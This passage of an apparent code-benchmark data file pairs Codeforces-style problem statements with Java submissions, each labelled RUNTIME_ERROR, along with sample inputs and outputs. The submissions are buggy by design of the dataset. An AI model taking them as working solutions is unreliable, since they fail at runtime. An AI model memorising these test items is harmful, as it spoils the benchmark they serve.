= 1;\n\t\t\tbyte c = read();\n\t\t\twhile (c <= ' ')\n\t\t\t\tc = read();\n\t\t\tboolean neg = (c == '-');\n\t\t\tif (neg)\n\t\t\t\tc = read();\n\n\t\t\tdo {\n\t\t\t\tret = ret * 10 + c - '0';\n\t\t\t} while ((c = read()) >= '0' && c <= '9');\n\n\t\t\tif (c == '.') {\n\t\t\t\twhile ((c = read()) >= '0' && c <= '9') {\n\t\t\t\t\tret += (c - '0') \/ (div *= 10);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (neg)\n\t\t\t\treturn -ret;\n\t\t\treturn ret;\n\t\t}\n\n\t\tprivate void fillBuffer() throws IOException {\n\t\t\tbytesRead = din.read(buffer, bufferPointer = 0, BUFFER_SIZE);\n\t\t\tif (bytesRead == -1)\n\t\t\t\tbuffer[0] = -1;\n\t\t}\n\n\t\tprivate byte read() throws IOException {\n\t\t\tif (bufferPointer == bytesRead)\n\t\t\t\tfillBuffer();\n\t\t\treturn buffer[bufferPointer++];\n\t\t}\n\n\t\tpublic void close() throws IOException {\n\t\t\tif (din == null)\n\t\t\t\treturn;\n\t\t\tdin.close();\n\t\t}\n\t}\n\n\tpublic static void main(String[] args) throws IOException {\n\t\tReader in = new Reader();\n\t\tint i, j, t, n, m;\n\t\t\/\/ t = in.nextInt();\n\t\tlong ans;\n\t\tn = in.nextInt();\n\t\tm = in.nextInt();\n\t\tin.readLine();\n\t\tString s;\n\t\tboolean unq[][] = new boolean[m][26];\n\t\tans = 1;\n\t\tfor (i = 0; i < n; i++) {\n\t\t\ts = in.readLine();\n\t\t\tfor (j = 0; j < m; j++) {\n\t\t\t\tint c = (int) s.charAt(j) - 65;\n\t\t\t\tunq[j][c] = true;\n\t\t\t}\n\t\t}\n\t\tfor (i = 0; i < m; i++) {\n\t\t\tint x = 0;\n\t\t\tfor (j = 0; j < 26; j++) {\n\t\t\t\tif (unq[i][j])\n\t\t\t\t\tx++;\n\t\t\t}\n\t\t\tans = ((ans % mod) * x) % mod;\n\t\t}\n\t\tSystem.out.println(ans);\n\t}\n}\n","description":"One day little Vasya found mom's pocket book. The book had n names of her friends and unusually enough, each name was exactly m letters long. Let's number the names from 1 to n in the order in which they are written.As mom wasn't home, Vasya decided to play with names: he chose three integers i, j, k (1\u2009\u2264\u2009i\u2009&lt;\u2009j\u2009\u2264\u2009n, 1\u2009\u2264\u2009k\u2009\u2264\u2009m), then he took names number i and j and swapped their prefixes of length k. For example, if we take names \"CBDAD\" and \"AABRD\" and swap their prefixes with the length of 3, the result will be names \"AABAD\" and \"CBDRD\".You wonder how many different names Vasya can write instead of name number 1, if Vasya is allowed to perform any number of the described actions. As Vasya performs each action, he chooses numbers i, j, k independently from the previous moves and his choice is based entirely on his will. The sought number can be very large, so you should only find it modulo 1000000007 (109\u2009+\u20097).","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100) \u2014 the number of names and the length of each name, correspondingly. Then n lines contain names, each name consists of exactly m uppercase Latin letters.","output_spec":"Print the single number \u2014 the number of different names that could end up in position number 1 in the pocket book after the applying the procedures described above. Print the number modulo 1000000007 (109\u2009+\u20097).","notes":"NoteIn the first sample Vasya can get the following names in the position number 1: \"AAB\", \"AAA\", \"BAA\" and \"BAB\".","sample_inputs":["2 3\nAAB\nBAA","4 5\nABABA\nBCGDG\nAAAAA\nYABSA"],"sample_outputs":["4","216"]}
{"difficulty":1500,"lang":"Java 8","lang_cluster":"java","src_uid":"a491be7d5883d594c3e907a22be607c9","submission_id":"re_457","tags":["two pointers","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.*;\n\npublic class Main\n{\n\tstatic int total[][],n,m;\n\n\n\tpublic static void main(String[] args)\n\t{\n\n\t\tScanner in = new Scanner(System.in);\n\t\tn = in.nextInt();\n\t\tm = in.nextInt();\n\n\t\ttotal = new int[n][m];\n\t\tint maxInt = 200;\n\n\t\tfor (int i=0;i < n;i++)\n\t\t\tfor (int j=0;j < m;j++)\n\t\t\t\ttotal[i][j] = maxInt;\n\n\n\t\tString str;\n\t\tint half = m % 2 == 0 ? m \/ 2 + 1 : m \/ 2;\n\t\tint count =0;\n\n\t\tfor (int i=0;i < n;i++)\n\t\t{\n\t\t\tstr = in.next();\n\n\t\t\tfor (int j=0;j < m;j++)\n\t\t\t\tif (str.charAt(j) == '1')\n\t\t\t\t{\n\t\t\t\t\ttotal[i][j] = 0;\n\t\t\t\t\tfillLeft(i, j, half);\n\t\t\t\t\tfillRight(i, j, half);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tcount++;\n\n\t\t\tif (count == m)\n\t\t\t{\n\t\t\t\tSystem.out.println(-1);\n\t\t\t\treturn;\n\t\t\t}\n\n\t\t}\/\/read data\n\n\t\tint min = maxInt,v;\n\n\t\tfor (int i =0;i < m;i++)\n\t\t{\n\t\t\tif ((v = sumColumn(i)) < min)\n\t\t\t\tmin = v;\n\t\t\t\t\n\t\t\tif(v==0)\n\t\t\t{\n\t\t\t\tSystem.out.println(-1);\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\n\n\t\tSystem.out.println(min);\n\n\t}\n\n\tpublic static int sumColumn(int col)\n\t{\n\t\tint sum = 0;\n\n\t\tfor (int i=0;i < n;i++)\n\t\t\tsum += total[i][col];\n\n\t\treturn sum;\n\t}\n\n\tpublic static void fillLeft(int row, int st, int step)\n\t{\n\n\n\t\tfor (int i =1;i <= step;i++)\n\t\t{\n\t\t\tst = st == 0 ? m - 1 : --st;\n\t\t\ttotal[row][st] = Math.min(total[row][st], i);\n\t\t}\n\n\t}\n\n\tpublic static void fillRight(int row, int st, int step)\n\t{\n\n\n\t\tfor (int i =1;i <= step;i++)\n\t\t{\n\t\t\tst = st == m - 1 ? 0 : ++st;\n\t\t\ttotal[row][st] = Math.min(total[row][st], i);\n\t\t}\n\n\t}\n\n}","description":"You are given a table consisting of n rows and m columns. Each cell of the table contains a number, 0 or 1. In one move we can choose some row of the table and cyclically shift its values either one cell to the left, or one cell to the right.To cyclically shift a table row one cell to the right means to move the value of each cell, except for the last one, to the right neighboring cell, and to move the value of the last cell to the first cell. A cyclical shift of a row to the left is performed similarly, but in the other direction. For example, if we cyclically shift a row \"00110\" one cell to the right, we get a row \"00011\", but if we shift a row \"00110\" one cell to the left, we get a row \"01100\".Determine the minimum number of moves needed to make some table column consist only of numbers 1.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers: n (1\u2009\u2264\u2009n\u2009\u2264\u2009100)\u00a0\u2014 the number of rows in the table and m (1\u2009\u2264\u2009m\u2009\u2264\u2009104)\u00a0\u2014 the number of columns in the table. Then n lines follow, each of them contains m characters \"0\" or \"1\": the j-th character of the i-th line describes the contents of the cell in the i-th row and in the j-th column of the table. It is guaranteed that the description of the table contains no other characters besides \"0\" and \"1\".","output_spec":"Print a single number: the minimum number of moves needed to get only numbers 1 in some column of the table. If this is impossible, print -1.","notes":"NoteIn the first sample one way to achieve the goal with the least number of moves is as follows: cyclically shift the second row to the right once, then shift the third row to the left twice. Then the table column before the last one will contain only 1s.In the second sample one can't shift the rows to get a column containing only 1s.","sample_inputs":["3 6\n101010\n000100\n100000","2 3\n111\n000"],"sample_outputs":["3","-1"]}
{"difficulty":1100,"lang":"Java 8","lang_cluster":"java","src_uid":"b1ef19d7027dc82d76859d64a6f43439","submission_id":"re_227","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.Scanner;\n\npublic class Letter {\n\tpublic static void main(String[] args) {\n\t\tScanner in = new Scanner(System.in);\n\t\tString s = in.nextLine();\n\t\tString check = in.nextLine();\n\t\tfor(int i=0;i<check.length();i++){\n\t\t\tif((!s.contains(check.charAt(i)+\"\"))|| (count(s,check.charAt(i))<count(check,check.charAt(i)))){\n\t\t\t\tSystem.out.println(\"NO\");\n\t\t\t\tSystem.exit(0);\n\t\t\t}\n\t\t}\n\t\tSystem.out.println(\"YES\");\n\t}\n\tstatic int count(String s,char ch){\n\t\tint c=0;\n\t\tfor(int i=0;i<s.length();i++){\n\t\t\tif(s.charAt(i)==ch)\n\t\t\t\tc++;\n\t\t}\n\t\treturn c;\n\t}\n}\n","description":"Vasya decided to write an anonymous letter cutting the letters out of a newspaper heading. He knows heading s1 and text s2 that he wants to send. Vasya can use every single heading letter no more than once. Vasya doesn't have to cut the spaces out of the heading \u2014 he just leaves some blank space to mark them. Help him; find out if he will manage to compose the needed text.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a newspaper heading s1. The second line contains the letter text s2. s1 \u0438 s2 are non-empty lines consisting of spaces, uppercase and lowercase Latin letters, whose lengths do not exceed 200 symbols. The uppercase and lowercase letters should be differentiated. Vasya does not cut spaces out of the heading.","output_spec":"If Vasya can write the given anonymous letter, print YES, otherwise print NO","notes":null,"sample_inputs":["Instead of dogging Your footsteps it disappears but you dont notice anything\nwhere is your dog","Instead of dogging Your footsteps it disappears but you dont notice anything\nYour dog is upstears","Instead of dogging your footsteps it disappears but you dont notice anything\nYour dog is upstears","abcdefg hijk\nk j i h g f e d c b a"],"sample_outputs":["NO","YES","NO","YES"]}
{"difficulty":1000,"lang":"Java 8","lang_cluster":"java","src_uid":"b9dacff0cab78595296d697d22dce5d9","submission_id":"re_367","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/* package whatever; \/\/ don't place package name! *\/\n\nimport java.util.*;\nimport java.lang.*;\nimport java.io.*;\n\n\/* Name of the class has to be \"Main\" only if the class is public. *\/\npublic class Leader\n{\n    public static void main(String[] args) throws java.lang.Exception {\n\t\tScanner f = new Scanner(System.in);\n\t\tint n=f.nextInt();\n\t\tString[] matrix = new String[n];\n\t\tint max=0;\n\t\tint index=0;\n\t\t\n\t\tfor(int i=0; i<n; i++){\n\t\tString handle = f.next();\n\t\tint score =(100*f.nextInt() -50*f.nextInt() + f.nextInt()+f.nextInt()+f.nextInt()+f.nextInt()+f.nextInt());\n\t\t\tmatrix[i]= handle+\" \"+ score;\n\t\tif(score>max){\n\t\t\tmax=score;\n\t\t\tindex=i;\n\t\t}\n\t\t}\n\t\t\n\t\tSystem.out.println(matrix[index].substring(0,matrix[index].indexOf(' ')));\n\n\n\t}\n\n}","description":"Let us remind you part of the rules of Codeforces. The given rules slightly simplified, use the problem statement as a formal document.In the beginning of the round the contestants are divided into rooms. Each room contains exactly n participants. During the contest the participants are suggested to solve five problems, A, B, C, D and E. For each of these problem, depending on when the given problem was solved and whether it was solved at all, the participants receive some points. Besides, a contestant can perform hacks on other contestants. For each successful hack a contestant earns 100 points, for each unsuccessful hack a contestant loses 50 points. The number of points for every contestant is represented by the sum of points he has received from all his problems, including hacks.You are suggested to determine the leader for some room; the leader is a participant who has maximum points.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n, which is the number of contestants in the room (1\u2009\u2264\u2009n\u2009\u2264\u200950). The next n lines contain the participants of a given room. The i-th line has the format of \"handlei plusi minusi ai bi ci di ei\" \u2014 it is the handle of a contestant, the number of successful hacks, the number of unsuccessful hacks and the number of points he has received from problems A, B, C, D, E correspondingly. The handle of each participant consists of Latin letters, digits and underscores and has the length from 1 to 20 characters. There are the following limitations imposed upon the numbers:    0\u2009\u2264\u2009plusi,\u2009minusi\u2009\u2264\u200950;  150\u2009\u2264\u2009ai\u2009\u2264\u2009500 or ai\u2009=\u20090, if problem A is not solved;  300\u2009\u2264\u2009bi\u2009\u2264\u20091000 or bi\u2009=\u20090, if problem B is not solved;  450\u2009\u2264\u2009ci\u2009\u2264\u20091500 or ci\u2009=\u20090, if problem C is not solved;  600\u2009\u2264\u2009di\u2009\u2264\u20092000 or di\u2009=\u20090, if problem D is not solved;  750\u2009\u2264\u2009ei\u2009\u2264\u20092500 or ei\u2009=\u20090, if problem E is not solved.  All the numbers are integer. All the participants have different handles. It is guaranteed that there is exactly one leader in the room (i.e. there are no two participants with the maximal number of points).","output_spec":"Print on the single line the handle of the room leader.","notes":"NoteThe number of points that each participant from the example earns, are as follows:   Petr \u2014 3860  tourist \u2014 4140  Egor \u2014 4030  c00lH4x0R \u2014 \u2009-\u2009350  some_participant \u2014 2220 Thus, the leader of the room is tourist.","sample_inputs":["5\nPetr 3 1 490 920 1000 1200 0\ntourist 2 0 490 950 1100 1400 0\nEgor 7 0 480 900 950 0 1000\nc00lH4x0R 0 10 150 0 0 0 0\nsome_participant 2 1 450 720 900 0 0"],"sample_outputs":["tourist"]}
{"difficulty":1000,"lang":"Java 11","lang_cluster":"java","src_uid":"bd5912fe2c5c37658f28f6b159b39645","submission_id":"re_734","tags":["implementation","greedy","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.Scanner;\n\npublic class Diversity {\n    public static void main(String[] args) {\n        Scanner s = new Scanner(System.in);\n        String str = s.next();\n        int k = s.nextInt();\n        int different = 0;\n        int[] a = new int[26];\n        for(int i = 0; i < str.length(); i++) {\n            a[str.charAt(i) - 97]++;\n        }\n        for(int i = 0; i < a.length; i++) {\n            if(a[i] != 0) different++;\n        }\n        if(str.length() - different >= k - different) System.out.println(str.length() - different);\n        else System.out.println(\"impossible\");\n    }\n}\n","description":"Calculate the minimum number of characters you need to change in the string s, so that it contains at least k different letters, or print that it is impossible.String s consists only of lowercase Latin letters, and it is allowed to change characters only to lowercase Latin letters too.","input_from":"standard input","output_to":"standard output","input_spec":"First line of input contains string s, consisting only of lowercase Latin letters (1\u2009\u2264\u2009|s|\u2009\u2264\u20091000, |s| denotes the length of s). Second line of input contains integer k (1\u2009\u2264\u2009k\u2009\u2264\u200926).","output_spec":"Print single line with a minimum number of necessary changes, or the word \u00abimpossible\u00bb (without quotes) if it is impossible.","notes":"NoteIn the first test case string contains 6 different letters, so we don't need to change anything.In the second test case string contains 4 different letters: {'a',\u2009'h',\u2009'o',\u2009'y'}. To get 5 different letters it is necessary to change one occurrence of 'o' to some letter, which doesn't occur in the string, for example, {'b'}.In the third test case, it is impossible to make 7 different letters because the length of the string is 6.","sample_inputs":["yandex\n6","yahoo\n5","google\n7"],"sample_outputs":["0","1","impossible"]}
{"difficulty":1000,"lang":"Java 11","lang_cluster":"java","src_uid":"bdd86c8bc54bbac6e2bb5a9d68b6eb1c","submission_id":"re_205","tags":["greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.BufferedInputStream;\nimport java.util.Scanner;\n\npublic class Main {\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(new BufferedInputStream(System.in));\n        int n = sc.nextInt();\n        boolean[] exist = new boolean[n];\n        for (int i = 0; i < n; i++) {\n            exist[sc.nextInt()-1] = true;\n        }\n        int res = 0;\n        for (int i = 0; i < n; i++) {\n            res += exist[i] ? 0 : 1;\n        }\n        System.out.println(res);\n    }\n}\n","description":"\"Hey, it's homework time\" \u2014 thought Polycarpus and of course he started with his favourite subject, IT. Polycarpus managed to solve all tasks but for the last one in 20 minutes. However, as he failed to solve the last task after some considerable time, the boy asked you to help him.The sequence of n integers is called a permutation if it contains all integers from 1 to n exactly once.You are given an arbitrary sequence a1,\u2009a2,\u2009...,\u2009an containing n integers. Each integer is not less than 1 and not greater than 5000. Determine what minimum number of elements Polycarpus needs to change to get a permutation (he should not delete or add numbers). In a single change he can modify any single sequence element (i. e. replace it with another integer).","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20095000) which represents how many numbers are in the sequence. The second line contains a sequence of integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20095000,\u20091\u2009\u2264\u2009i\u2009\u2264\u2009n).","output_spec":"Print the only number \u2014 the minimum number of changes needed to get the permutation.","notes":"NoteThe first sample contains the permutation, which is why no replacements are required.In the second sample it is enough to replace the first element with the number 1 and that will make the sequence the needed permutation.In the third sample we can replace the second element with number 4 and the fourth element with number 2.","sample_inputs":["3\n3 1 2","2\n2 2","5\n5 3 3 3 1"],"sample_outputs":["0","1","2"]}
{"difficulty":1200,"lang":"Java 8","lang_cluster":"java","src_uid":"c31fed523230af1f904218b2fe0d663d","submission_id":"re_821","tags":["implementation","sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.Scanner;\npublic class Ishu\n{\n    \tpublic static void main(String[] args)\n    \t{\n\t Scanner scan=new Scanner(System.in);\t\n\t int n,t,i,sum=0;\n\t float l,r;\n\t int[][] a=new int[2][1000];\n\t n=scan.nextInt();\n\t t=scan.nextInt();\n\t for(i=0;i<n;++i)\n\t\t{\n\t\t a[0][i]=scan.nextInt();\n\t \t a[1][i]=scan.nextInt();\n\t\t}\n\t for(i=1;i<n;++i)\n\t\t{\n\t\t r=(float)a[0][i]-(float)a[1][i]\/2;\n\t\t l=(float)a[0][i-1]+(float)a[1][i-1]\/2;\n\t\t if(r-l==(float)t)\n\t\t\t++sum;\n\t\t else if(r-l>(float)t)\n\t\t\tsum+=2;\n\t\t}\n\t System.out.println((sum+2));\n \t}\n}","description":"A new cottage village called \u00abFlatville\u00bb is being built in Flatland. By now they have already built in \u00abFlatville\u00bb n square houses with the centres on the \u041ex-axis. The houses' sides are parallel to the coordinate axes. It's known that no two houses overlap, but they can touch each other.The architect bureau, where Peter works, was commissioned to build a new house in \u00abFlatville\u00bb. The customer wants his future house to be on the \u041ex-axis, to be square in shape, have a side t, and touch at least one of the already built houses. For sure, its sides should be parallel to the coordinate axes, its centre should be on the Ox-axis and it shouldn't overlap any of the houses in the village.Peter was given a list of all the houses in \u00abFlatville\u00bb. Would you help him find the amount of possible positions of the new house?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains numbers n and t (1\u2009\u2264\u2009n,\u2009t\u2009\u2264\u20091000). Then there follow n lines, each of them contains two space-separated integer numbers: xi ai, where xi \u2014 x-coordinate of the centre of the i-th house, and ai \u2014 length of its side (\u2009-\u20091000\u2009\u2264\u2009xi\u2009\u2264\u20091000, 1\u2009\u2264\u2009ai\u2009\u2264\u20091000).","output_spec":"Output the amount of possible positions of the new house.","notes":"NoteIt is possible for the x-coordinate of the new house to have non-integer value.","sample_inputs":["2 2\n0 4\n6 2","2 2\n0 4\n5 2","2 3\n0 4\n5 2"],"sample_outputs":["4","3","2"]}
{"difficulty":1200,"lang":"Java 8","lang_cluster":"java","src_uid":"c3244e952830643938d51ce14f043d7d","submission_id":"re_428","tags":["strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.Scanner;\npublic class Ishu\n{\n    \tpublic static void main(String[] args)\n    \t{\n\t Scanner scan=new Scanner(System.in);  \n\t int i,j,flag=0;\n\t String s1,s2,s3;\n\t char[] ch=new char[100000];\n\t char[] ch1=new char[100000];\n\t s1=scan.next();\n\t s2=scan.next();\n\t s3=scan.next();\n\t for(i=0;i<=s1.length()-s2.length()-s3.length();++i)\n\t\t{\n\t\t if(s1.substring(i,i+s2.length()).equals(s2))\n\t\t\tfor(j=i+s2.length();j<=s1.length()-s3.length();++j)\n\t\t\t\tif(s1.substring(j,j+s3.length()).equals(s3))\n\t\t\t\t\t{\n\t\t\t\t\t ++flag;\n\t\t\t\t\t break;\n\t\t\t\t\t}\n\t\t if(flag==1)\n\t\t\tbreak;\n\t\t}\n\t ch=s1.toCharArray();\n\t for(i=0,j=s1.length()-1;i<s1.length();++i,--j)\n\t\tch1[j]=ch[i];\n\t s1=String.valueOf(ch1);\n\t for(i=0;i<=s1.length()-s2.length()-s3.length();++i)\n\t\t{\n\t\t if(s1.substring(i,i+s2.length()).equals(s2))\n\t\t\tfor(j=i+s2.length();j<=s1.length()-s3.length();++j)\n\t\t\t\tif(s1.substring(j,j+s3.length()).equals(s3))\n\t\t\t\t\t{\n\t\t\t\t\t flag+=2;\n\t\t\t\t\t break;\n\t\t\t\t\t}\n\t\t if(flag==3)\n\t\t\tbreak;\n\t\t}\n\t if(flag==3)\n\t\tSystem.out.println(\"both\");\n\t else if(flag==2)\n\t\tSystem.out.println(\"backward\");\n\t else if(flag==1)\n\t\tSystem.out.println(\"forward\");\n\t else\n\t\tSystem.out.println(\"fantasy\");\n \t}\n}","description":"Peter likes to travel by train. He likes it so much that on the train he falls asleep. Once in summer Peter was going by train from city A to city B, and as usual, was sleeping. Then he woke up, started to look through the window and noticed that every railway station has a flag of a particular colour.The boy started to memorize the order of the flags' colours that he had seen. But soon he fell asleep again. Unfortunately, he didn't sleep long, he woke up and went on memorizing the colours. Then he fell asleep again, and that time he slept till the end of the journey.At the station he told his parents about what he was doing, and wrote two sequences of the colours that he had seen before and after his sleep, respectively.Peter's parents know that their son likes to fantasize. They give you the list of the flags' colours at the stations that the train passes sequentially on the way from A to B, and ask you to find out if Peter could see those sequences on the way from A to B, or from B to A. Remember, please, that Peter had two periods of wakefulness.Peter's parents put lowercase Latin letters for colours. The same letter stands for the same colour, different letters \u2014 for different colours.","input_from":"standard input","output_to":"standard output","input_spec":"The input data contains three lines. The first line contains a non-empty string, whose length does not exceed 105, the string consists of lowercase Latin letters \u2014 the flags' colours at the stations on the way from A to B. On the way from B to A the train passes the same stations, but in reverse order.  The second line contains the sequence, written by Peter during the first period of wakefulness. The third line contains the sequence, written during the second period of wakefulness. Both sequences are non-empty, consist of lowercase Latin letters, and the length of each does not exceed 100 letters. Each of the sequences is written in chronological order. ","output_spec":"Output one of the four words without inverted commas:    \u00abforward\u00bb \u2014 if Peter could see such sequences only on the way from A to B;  \u00abbackward\u00bb \u2014 if Peter could see such sequences on the way from B to A;  \u00abboth\u00bb \u2014 if Peter could see such sequences both on the way from A to B, and on the way from B to A;  \u00abfantasy\u00bb \u2014 if Peter could not see such sequences. ","notes":"NoteIt is assumed that the train moves all the time, so one flag cannot be seen twice. There are no flags at stations A and B.","sample_inputs":["atob\na\nb","aaacaaa\naca\naa"],"sample_outputs":["forward","both"]}
{"difficulty":1200,"lang":"Java 8","lang_cluster":"java","src_uid":"d90da1e932a6aa546bec4e1bd4b1fbec","submission_id":"re_974","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.Scanner;\npublic class Ishu\n{\n\tpublic static void main(String[] args)\n\t{\n\tScanner scan=new Scanner(System.in);\t\n\tboolean flag=false;\n\tint n,m,i,j,k,l,temp=0,sum=0;\n\tint[][] a=new int[2][100];\n\tint[][] match=new int[4950][2];\n\tn=scan.nextInt();\n\tm=scan.nextInt();\n\tfor(i=0;i<n;++i)\n\t\t{\n\t\ta[0][i]=scan.nextInt();\n\t\ta[1][i]=i+1;\n\t\t}\n\tfor(i=0;i<m;++i)\n\t\t{\n\t\tmatch[i][0]=scan.nextInt();\n\t\tmatch[i][1]=scan.nextInt();\n\t\t}\n\tfor(i=0;i<n;++i)\n\t\tfor(j=0;j<n-1;++j)\n\t\t\tif(a[0][j]>a[0][j+1])\n\t\t\t\t{\n\t\t\t\ta[0][j]=a[0][j]+a[0][j+1];\n\t\t\t\ta[0][j+1]=a[0][j]-a[0][j+1];\n\t\t\t\ta[0][j]=a[0][j]-a[0][j+1];\n\t\t\t\ta[1][j]=a[1][j]+a[1][j+1];\n\t\t\t\ta[1][j+1]=a[1][j]-a[1][j+1];\n\t\t\t\ta[1][j]=a[1][j]-a[1][j+1];\t\n\t\t\t\t}\n\tfor(i=0;i<n-2;++i)\n\t\t{\n\t\tfor(j=0;j<n-1;++j)\n\t\t\t{\n\t\t\tfor(k=0;k<n;++k)\n\t\t\t\t{\n\t\t\t\tsum=a[0][i]+a[0][j]+a[0][k];\n\t\t\t\ttemp=0;\n\t\t\t\tfor(l=0;l<m;++l)\n\t\t\t\t\t{\n\t\t\t\t\tif((match[l][0]==a[1][i]&&match[l][1]==a[1][j])||(match[l][1]==a[1][i]&&match[l][0]==a[1][j]))\n\t\t\t\t\t\t++temp;\n\t\t\t\t\telse if((match[l][0]==a[1][j]&&match[l][1]==a[1][k])||(match[l][1]==a[1][j]&&match[l][0]==a[1][k]))\n\t\t\t\t\t\t++temp;\n\t\t\t\t\telse if((match[l][0]==a[1][i]&&match[l][1]==a[1][k])||(match[l][1]==a[1][i]&&match[l][0]==a[1][k]))\n\t\t\t\t\t\t++temp;\n\t\t\t\t\tif(temp==3)\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tif(temp==3)\n\t\t\t\t\t{\n\t\t\t\t\tflag=true;\n\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\tif(flag)\n\t\t\t\tbreak;\n\t\t\t}\n\t\tif(flag)\n\t\t\tbreak;\n\t\t}\n\tif(flag)\n\t\tSystem.out.println(sum);\n\telse\n\t\tSystem.out.println(-1);\n\t}\n}","description":"A little boy Gerald entered a clothes shop and found out something very unpleasant: not all clothes turns out to match. For example, Gerald noticed that he looks rather ridiculous in a smoking suit and a baseball cap.Overall the shop sells n clothing items, and exactly m pairs of clothing items match. Each item has its price, represented by an integer number of rubles. Gerald wants to buy three clothing items so that they matched each other. Besides, he wants to spend as little money as possible. Find the least possible sum he can spend.","input_from":"standard input","output_to":"standard output","input_spec":"The first input file line contains integers n and m \u2014 the total number of clothing items in the shop and the total number of matching pairs of clothing items (). Next line contains n integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009106) \u2014 the prices of the clothing items in rubles. Next m lines each contain a pair of space-separated integers ui and vi (1\u2009\u2264\u2009ui,\u2009vi\u2009\u2264\u2009n,\u2009ui\u2009\u2260\u2009vi). Each such pair of numbers means that the ui-th and the vi-th clothing items match each other. It is guaranteed that in each pair ui and vi are distinct and all the unordered pairs (ui,\u2009vi) are different.","output_spec":"Print the only number \u2014 the least possible sum in rubles that Gerald will have to pay in the shop. If the shop has no three clothing items that would match each other, print \"-1\" (without the quotes).","notes":"NoteIn the first test there only are three pieces of clothing and they all match each other. Thus, there is only one way \u2014 to buy the 3 pieces of clothing; in this case he spends 6 roubles.The second test only has three pieces of clothing as well, yet Gerald can't buy them because the first piece of clothing does not match the third one. Thus, there are no three matching pieces of clothing. The answer is -1.In the third example there are 4 pieces of clothing, but Gerald can't buy any 3 of them simultaneously. The answer is -1.","sample_inputs":["3 3\n1 2 3\n1 2\n2 3\n3 1","3 2\n2 3 4\n2 3\n2 1","4 4\n1 1 1 1\n1 2\n2 3\n3 4\n4 1"],"sample_outputs":["6","-1","-1"]}
{"difficulty":800,"lang":"Java 8","lang_cluster":"java","src_uid":"ef9ff63d225811868e786e800ce49c92","submission_id":"re_330","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.lang.reflect.Array;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.Scanner;\nimport java.util.Arrays;\npublic class Main {\n\n    public static void main(String[] args) {\n\n        int n;\n        Scanner sc = new Scanner(System.in);\n        n = sc.nextInt();\n        int ai[] = new  int[n];\n\n        int count = 0 ;\n        for (int i = 0; i < n; i++) {\n            ai[i]=sc.nextInt();\n        }\n\n        int min = ai[0] ;\n        int max= ai[0];\n        int min_index = 0 , max_index = 0 ;\n\n        for (int i = 0; i < n; i++) {\n            if (ai[i] == min  ) {\n                min_index = i;\n            }\n                if (ai[i] < min  ) {\n                    min_index = i;\n            }\n                else if (ai[i] > max ) {\n                max_index = i;\n            }\n        }\n        System.out.println(\"min index = \"+ min_index);\n        System.out.println(\"max index = \"+ max_index);\n        if ( min_index < max_index) {\n            System.out.println(max_index - 1 + n - min_index - 1);\n        }\n        else if ( min_index > max_index) {\n            System.out.println(max_index + (n - min_index) );\n        }\n\n    }\n}\n","description":"A Ministry for Defense sent a general to inspect the Super Secret Military Squad under the command of the Colonel SuperDuper. Having learned the news, the colonel ordered to all n squad soldiers to line up on the parade ground.By the military charter the soldiers should stand in the order of non-increasing of their height. But as there's virtually no time to do that, the soldiers lined up in the arbitrary order. However, the general is rather short-sighted and he thinks that the soldiers lined up correctly if the first soldier in the line has the maximum height and the last soldier has the minimum height. Please note that the way other solders are positioned does not matter, including the case when there are several soldiers whose height is maximum or minimum. Only the heights of the first and the last soldier are important.For example, the general considers the sequence of heights (4, 3, 4, 2, 1, 1) correct and the sequence (4, 3, 1, 2, 2) wrong.Within one second the colonel can swap any two neighboring soldiers. Help him count the minimum time needed to form a line-up which the general will consider correct.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains the only integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) which represents the number of soldiers in the line. The second line contains integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u2009100) the values of the soldiers' heights in the order of soldiers' heights' increasing in the order from the beginning of the line to its end. The numbers are space-separated. Numbers a1,\u2009a2,\u2009...,\u2009an are not necessarily different.","output_spec":"Print the only integer \u2014 the minimum number of seconds the colonel will need to form a line-up the general will like.","notes":"NoteIn the first sample the colonel will need to swap the first and second soldier and then the third and fourth soldier. That will take 2 seconds. The resulting position of the soldiers is (44, 33, 22, 11).In the second sample the colonel may swap the soldiers in the following sequence:  (10, 10, 58, 31, 63, 40, 76)  (10, 58, 10, 31, 63, 40, 76)  (10, 58, 10, 31, 63, 76, 40)  (10, 58, 10, 31, 76, 63, 40)  (10, 58, 31, 10, 76, 63, 40)  (10, 58, 31, 76, 10, 63, 40)  (10, 58, 31, 76, 63, 10, 40)  (10, 58, 76, 31, 63, 10, 40)  (10, 76, 58, 31, 63, 10, 40)  (76, 10, 58, 31, 63, 10, 40)  (76, 10, 58, 31, 63, 40, 10) ","sample_inputs":["4\n33 44 11 22","7\n10 10 58 31 63 40 76"],"sample_outputs":["2","10"]}
